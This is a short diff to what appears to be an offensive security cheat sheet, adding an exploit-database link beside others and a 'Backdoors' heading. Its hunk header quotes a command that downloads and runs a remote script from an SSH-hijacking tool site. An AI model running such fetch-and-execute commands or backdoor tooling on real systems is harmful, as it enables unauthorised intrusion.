@@ -846,6 +846,7 @@ bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 Exploits
 1. https://packetstormsecurity.com/ - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
 1. https://www.exploit-db.com/ - Also includes metasploit db and google hacking db
+1. https://exploits.shodan.io/welcome - Similar to exploit-db
 
 Backdoors
 1. https://www.gsocket.io/deploy - Our very own
